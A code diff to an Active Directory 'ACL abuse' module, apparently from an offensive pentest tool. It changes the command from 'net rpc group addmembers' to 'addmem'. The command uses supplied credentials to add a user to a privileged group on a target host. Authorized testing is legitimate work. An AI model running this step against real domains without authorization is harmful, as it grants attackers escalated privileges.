@@ -181,10 +181,10 @@ class ACLAbuseModule:
         domain = state.domain
 
         # ── Build exact playbook command ──────────────────────────────────
-        # net rpc group addmembers "<group>" "<user>" -U "<domain>\<user>%<pass>" -S <target>
+        # net rpc group addmem "<group>" "<user>" -U "<domain>\<user>%<pass>" -S <target>
         auth_str = f"{domain}\\{auth_user}%{auth_pass}"
         cmd = [
-            "net", "rpc", "group", "addmembers",
+            "net", "rpc", "group", "addmem",
             target_group,
             member_user,
             "-U", auth_str,
@@ -193,7 +193,7 @@ class ACLAbuseModule:
 
         # Show redacted command to operator
         redacted = (
-            f"net rpc group addmembers \"{target_group}\" \"{member_user}\" "
+            f"net rpc group addmem \"{target_group}\" \"{member_user}\" "
             f"-U \"{domain}\\{auth_user}%****\" -S {state.target_ip}"
         )
         console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]\n")
